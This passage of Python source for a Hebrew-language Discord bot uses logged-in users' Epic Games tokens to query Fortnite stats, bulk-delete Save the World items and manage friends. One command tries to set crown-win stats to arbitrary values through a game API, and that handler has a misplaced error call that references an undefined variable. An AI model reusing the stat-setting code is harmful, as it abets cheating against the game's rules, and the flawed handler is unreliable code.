            if "disabled" in str(data).lower() or "banned" in err_msg.lower():
                embed.description = f"⛔ **החשבון מושעה!**\n```{err_msg[:300]}```"
                embed.color = 0xff0000
            else:
                embed.description = f"⚠️ גישה נדחתה ({status})"
                embed.color = 0xff9900
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "check-ban")
        else:
            embed.description = f"⚠️ תגובה לא צפויה ({status})"
            embed.color = 0xff9900
            await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /check-rank ---
@bot.tree.command(name="check-rank", description="Checks your Fortnite ranked stats")
async def check_rank(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=athena&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        stats = {}
        try:
            stats = data["profileChanges"][0]["profile"]["stats"]["attributes"]
        except Exception:
            pass
        rank_track = stats.get("s29_ranked_track", {})
        current_division = rank_track.get("currentDivision", 0)
        promotions = rank_track.get("promotionProgress", 0)
        rank_names = ["Bronze I","Bronze II","Bronze III","Silver I","Silver II","Silver III",
                      "Gold I","Gold II","Gold III","Platinum I","Platinum II","Platinum III",
                      "Diamond I","Diamond II","Diamond III","Elite","Champion","Unreal"]
        rank_display = rank_names[current_division] if current_division < len(rank_names) else f"Division {current_division}"
        embed = discord.Embed(title="🏅 Ranked Stats", color=0xffd700)
        embed.add_field(name="👤 שחקן", value=f"**{display_name}**", inline=False)
        embed.add_field(name="🎖️ Rank", value=f"**{rank_display}**", inline=True)
        embed.add_field(name="📈 Progress", value=f"`{promotions}`", inline=True)
        embed.set_footer(text="Fortnite Ranked • Season Stats")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "check-rank")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /xp-status ---
@bot.tree.command(name="xp-status", description="Check your Battle Royale XP and Level")
async def xp_status(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=athena&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        stats = {}
        try:
            stats = data["profileChanges"][0]["profile"]["stats"]["attributes"]
        except Exception:
            pass
        level = stats.get("level", 0)
        xp = stats.get("xp", 0)
        book_level = stats.get("book_level", 0)
        book_xp = stats.get("book_xp", 0)
        embed = discord.Embed(title="⭐ XP & Level Status", color=0x00a2ff)
        embed.add_field(name="👤 שחקן", value=f"**{display_name}**", inline=False)
        embed.add_field(name="⭐ BR Level", value=f"`{level}`", inline=True)
        embed.add_field(name="✨ XP", value=f"`{xp:,}`", inline=True)
        embed.add_field(name="🎁 Battle Pass Level", value=f"`{book_level}`", inline=True)
        embed.add_field(name="📘 Battle Pass XP", value=f"`{book_xp:,}`", inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "xp-status")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /search-cosmetic ---
@bot.tree.command(name="search-cosmetic", description="Search for a Fortnite cosmetic")
@discord.app_commands.describe(name="שם הקוסמטיק (באנגלית)")
async def search_cosmetic(interaction: Interaction, name: str):
    await interaction.response.defer(ephemeral=True)
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            url = f"https://fortnite-api.com/v2/cosmetics/br/search?name={name}&matchMethod=contains&language=en"
            async with session.get(url, headers={"Authorization": FORTNITE_API_KEY}) as r:
                data = await r.json() if r.status == 200 else {}
        item = data.get("data", {})
        if not item:
            await interaction.followup.send(f"❌ לא נמצא קוסמטיק בשם **{name}**.", ephemeral=True)
            return
        embed = discord.Embed(title=f"🎮 {item.get('name', name)}", color=0x00a2ff)
        embed.add_field(name="🆔 ID", value=f"`{item.get('id', '?')}`", inline=True)
        embed.add_field(name="📂 Type", value=f"`{item.get('type', {}).get('displayValue', '?')}`", inline=True)
        embed.add_field(name="⭐ Rarity", value=f"`{item.get('rarity', {}).get('displayValue', '?')}`", inline=True)
        desc = item.get("description", "")
        if desc:
            embed.add_field(name="📝 תיאור", value=desc[:200], inline=False)
        img = item.get("images", {})
        icon = img.get("icon") or img.get("smallIcon") or img.get("featured")
        if icon:
            embed.set_thumbnail(url=icon)
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "search-cosmetic")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /custom-crowns ---
class CrownsModal(discord.ui.Modal, title="👑 שינוי Crown Wins"):
    crowns_input = discord.ui.TextInput(label="כמה Crown Wins תרצה?", placeholder="לדוגמה: 100", min_length=1, max_length=6, required=True)

    async def on_submit(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=True)
        raw = self.crowns_input.value.strip()
        if not raw.isdigit():
            await interaction.followup.send("❌ הכנס מספר שלם בלבד.", ephemeral=True)
            return
        target = int(raw)
        if target < 0 or target > 999999:
            await interaction.followup.send("❌ ערך לא חוקי.", ephemeral=True)
            return
        account_id, user_auth, access_token = await get_user_account(interaction.user.id)
        if not access_token:
            await interaction.followup.send("❌ Session פג.", ephemeral=True)
            return
        headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
        display_name = user_auth.get('displayName', account_id)
        fn_base = "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile"
        try:
            connector = aiohttp.TCPConnector(use_dns_cache=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                set_url = f"{fn_base}/{account_id}/client/SetBattleRoyaleSeasonStat?profileId=athena&rvn=-1"
                payload = {"statName": "s_season_crown_wins_total", "statValue": target}
                async with session.post(set_url, headers=headers, json=payload) as sr:
                    set_status = sr.status
            embed = discord.Embed(title="👑 Crown Wins", color=0xffd700)
            embed.add_field(name="👤 שחקן", value=f"**{display_name}**", inline=True)
            embed.add_field(name="🎯 יעד", value=f"`{target}`", inline=True)
            if set_status == 200:
                embed.description = f"✅ Crown Wins עודכן ל-**{target}**!"
                embed.color = 0x00ff00
                await interaction.followup.send(embed=embed, ephemeral=True)
                await log_success(interaction, "custom-crowns")
            else:
                embed.description = "⚠️ ה-API של Fortnite לא אפשר שינוי ישיר."
                embed.color = 0xff9900
                await interaction.followup.send(embed=embed, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


@bot.tree.command(name="custom-crowns", description="שנה את מספר ה-Crown Wins שלך")
async def custom_crowns(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.send_modal(CrownsModal())


# --- /backpack-destroy-all ---
@bot.tree.command(name="backpack-destroy-all", description="Deletes all items in your Save The World Backpack")
async def backpack_destroy_all(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=theater0&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
            items = {}
            try:
                items = data["profileChanges"][0]["profile"]["items"]
            except Exception:
                pass
            item_ids = [iid for iid, idata in items.items() if not idata.get("templateId", "").startswith(("Schematic:", "Worker:", "Defender:"))]
            deleted = 0
            for batch_start in range(0, len(item_ids), 100):
                batch = item_ids[batch_start:batch_start+100]
                async with session.post(f"{fn_base}/RecycleItemBatch?profileId=theater0&rvn=-1", headers=headers, json={"targetItemIds": batch}) as r2:
                    if r2.status == 200:
                        deleted += len(batch)
        embed = discord.Embed(title="🗑️ Backpack Destroyed", color=0x00ff00)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        embed.description = f"✅ נמחקו **{deleted}** פריטים מהתיק."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "backpack-destroy-all")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /storage-destroy-all ---
@bot.tree.command(name="storage-destroy-all", description="Deletes all items in your Save The World Storage")
async def storage_destroy_all(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=outpost0&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
            items = {}
            try:
                items = data["profileChanges"][0]["profile"]["items"]
            except Exception:
                pass
            item_ids = list(items.keys())
            deleted = 0
            for batch_start in range(0, len(item_ids), 100):
                batch = item_ids[batch_start:batch_start+100]
                async with session.post(f"{fn_base}/RecycleItemBatch?profileId=outpost0&rvn=-1", headers=headers, json={"targetItemIds": batch}) as r2:
                    if r2.status == 200:
                        deleted += len(batch)
        embed = discord.Embed(title="🗑️ Storage Destroyed", color=0x00ff00)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        embed.description = f"✅ נמחקו **{deleted}** פריטים מהאחסון."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "storage-destroy-all")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /skip-stw-tutorial ---
@bot.tree.command(name="skip-stw-tutorial", description="Skip the Tutorial for Save The World")
async def skip_stw_tutorial(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/MarkQuestComplete?profileId=campaign&rvn=-1", headers=headers, json={"questId": "Quest_Campaign_Tutorial"}) as r:
                st1 = r.status
        embed = discord.Embed(title="⏭️ Skip STW Tutorial", color=0x00ff00)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        embed.description = f"✅ ניסיון לדלג על Tutorial נשלח. (`{st1}`)"
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "skip-stw-tutorial")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /check-founders ---
@bot.tree.command(name="check-founders", description="Check what Save The World edition(s) you own")
async def check_founders(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=common_core&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        items = {}
        try:
            items = data["profileChanges"][0]["profile"]["items"]
        except Exception:
            pass
        keywords = ["Founders", "StandardEdition", "DeluxeEdition", "SuperDeluxe", "LimitedEdition", "UltimateEdition", "SaveTheWorld"]
        found = []
        for item in items.values():
            tid = item.get("templateId", "")
            for kw in keywords:
                if kw.lower() in tid.lower():
                    clean = tid.split(":")[-1].replace("_", " ")
                    if clean not in found:
                        found.append(clean)
        embed = discord.Embed(title="🎖️ Founders Pack Check", color=0xffd700)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        if found:
            embed.description = "✅ **נמצאו מהדורות STW:**\n" + "\n".join(f"• `{f}`" for f in found)
            embed.color = 0x00ff00
        else:
            embed.description = "❌ לא נמצא Founders Pack בחשבון זה."
            embed.color = 0xff4444
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "check-founders")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /daily-quests ---
@bot.tree.command(name="daily-quests", description="Fetch your daily Save the World quests")
async def daily_quests(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=campaign&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        items = {}
        try:
            items = data["profileChanges"][0]["profile"]["items"]
        except Exception:
            pass
        quests = []
        for item in items.values():
            tid = item.get("templateId", "")
            if tid.startswith("Quest:daily_"):
                attrs = item.get("attributes", {})
                completion = 0
                objective = 1
                for k, v in attrs.items():
                    if k.startswith("completion_"):
                        completion = v
                    if k.startswith("max_"):
                        objective = v
                n = tid.replace("Quest:daily_", "").replace("_", " ").title()
                done = "✅" if completion >= objective else "🔄"
                quests.append(f"{done} **{n}** `{completion}/{objective}`")
        embed = discord.Embed(title="📋 Daily Quests — STW", color=0x00a2ff)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        if quests:
            embed.description = "\n".join(quests[:10])
            embed.color = 0x00ff00
        else:
            embed.description = "📭 לא נמצאו קווסטים יומיים."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "daily-quests")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /vber ---
@bot.tree.command(name="vber", description="Vbuck missions check on Fortnite")
async def vber(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            url = "https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/world/info"
            async with session.get(url, headers=headers) as r:
                data = await r.json() if r.status == 200 else {}
        embed = discord.Embed(title="⚡ V-Buck Missions (VBer)", color=0xffd700)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        vbuck_missions = []
        try:
            for theater in data.get("theaters", []):
                for mission in theater.get("missionAlerts", {}).get("availableMissions", []):
                    for reward in mission.get("missionAlertRewards", {}).get("items", []):
                        if "MtxGiveaway" in reward.get("itemType", ""):
                            qty = reward.get("quantity", 0)
                            zone = mission.get("missionGenerator", "?").split("MissionAlert_")[-1]
                            vbuck_missions.append(f"• **{qty} V-Bucks** — `{zone}`")
        except Exception:
            pass
        if vbuck_missions:
            embed.description = f"✅ נמצאו **{len(vbuck_missions)}** משימות:\n\n" + "\n".join(vbuck_missions[:15])
            embed.color = 0x00ff00
        else:
            embed.description = "📭 אין משימות V-Bucks זמינות כרגע."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "vber")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /add-friend ---
@bot.tree.command(name="add-friend", description="Sends a friend request")
@discord.app_commands.describe(username="Epic Games display name")
async def add_friend(interaction: Interaction, username: str):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{username}", headers=headers) as r:
                if r.status == 404:
                    await interaction.followup.send(f"❌ השחקן **{username}** לא נמצא.", ephemeral=True)
                    return
                target = await r.json()
                tid = target.get("id")
                tname = target.get("displayName", username)
            add_url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/friends/{tid}"
            async with session.post(add_url, headers=headers) as r2:
                if r2.status in [200, 204]:
                    embed = discord.Embed(title="✅ Friend Request Sent", description=f"נשלחה בקשת חברות ל-**{tname}**!", color=0x00ff00)
                    await interaction.followup.send(embed=embed, ephemeral=True)
                    await log_success(interaction, "add-friend")
                else:
                    embed = discord.Embed(title="⚠️ שגיאה", description=f"Status: `{r2.status}`", color=0xff4444)
                    await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /remove-friend ---
@bot.tree.command(name="remove-friend", description="Unfriends a user")
@discord.app_commands.describe(username="Epic Games display name")
async def remove_friend(interaction: Interaction, username: str):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{username}", headers=headers) as r:
                if r.status == 404:
                    await interaction.followup.send(f"❌ לא נמצא **{username}**.", ephemeral=True)
                    return
                target = await r.json()
                tid = target.get("id")
                tname = target.get("displayName", username)
            async with session.delete(f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/friends/{tid}", headers=headers) as r2:
                st = r2.status
        if st in [200, 204]:
            embed = discord.Embed(title="✅ Friend Removed", description=f"**{tname}** הוסר.", color=0x00ff00)
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "remove-friend")
        else:
            await interaction.followup.send(embed=discord.Embed(title="⚠️ שגיאה", description=f"Status: `{st}`", color=0xff4444), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /friends-list ---
@bot.tree.command(name="friends-list", description="Displays your Epic Games friends list")
async def friends_list(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}"}
    friends_base = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"{friends_base}/friends", headers=headers) as r:
                friends = await r.json() if r.status == 200 else []
            friend_ids = [f.get("accountId") for f in friends if f.get("accountId")]
            names = []
            if friend_ids:
                ids_param = "&accountId=".join(friend_ids[:100])
                url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account?accountId={ids_param}"
                async with session.get(url, headers=headers) as r2:
                    accs = await r2.json() if r2.status == 200 else []
                    for a in accs:
                        names.append(a.get("displayName", a.get("id", "?")))
        embed = discord.Embed(title=f"👥 Friends List — {display_name}", color=0x00a2ff)
        if names:
            chunks = [names[i:i+20] for i in range(0, len(names), 20)]
            embed.description = "\n".join(f"• **{n}**" for n in chunks[0])
            embed.set_footer(text=f"Showing {len(chunks[0])} of {len(names)} friends")
        else:
            embed.description = "📭 אין חברים ברשימה."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "friends-list")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /accept-incoming ---
@bot.tree.command(name="accept-incoming", description="Accept all pending incoming friend requests")
async def accept_incoming(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    friends_url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/friends/incoming"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(friends_url, headers=headers) as r:
                incoming = await r.json() if r.status == 200 else []
            accepted = 0
            for req in incoming:
                fid = req.get("accountId")
                if fid:
                    async with session.post(f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/friends/{fid}", headers=headers) as pr:
                        if pr.status in [200, 204]:
                            accepted += 1
        await interaction.followup.send(f"✅ התקבלו **{accepted}** בקשות חברות.", ephemeral=True)
        await log_success(interaction, "accept-incoming")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /clear-friends ---
@bot.tree.command(name="clear-friends", description="Remove all friends from your list")
async def clear_friends(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}"}
    friends_base = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"{friends_base}/friends", headers=headers) as r:
                friends = await r.json() if r.status == 200 else []
            removed = 0
            for f in friends:
                fid = f.get("accountId")
                if fid:
                    async with session.delete(f"{friends_base}/friends/{fid}", headers=headers) as dr:
                        if dr.status in [200, 204]:
                            removed += 1
        await interaction.followup.send(f"✅ הוסרו **{removed}** חברים.", ephemeral=True)
        await log_success(interaction, "clear-friends")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /view-blocklist ---
@bot.tree.command(name="view-blocklist", description="View your blocked users list")
async def view_blocklist(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/blocklist", headers=headers) as r:
                blocked = await r.json() if r.status == 200 else []
        embed = discord.Embed(title="🚫 Blocklist", color=0xff4444)
        if blocked:
            embed.description = "\n".join(f"• `{b.get('accountId','?')}`" for b in blocked[:20])
            embed.set_footer(text=f"Total blocked: {len(blocked)}")
        else:
            embed.description = "✅ רשימת החסומים ריקה."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "view-blocklist")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /block-user ---
@bot.tree.command(name="block-user", description="Block an Epic Games user")
@discord.app_commands.describe(username="Epic Games display name")
async def block_user(interaction: Interaction, username: str):
    if not is_user_logged_in(interaction.user.id):
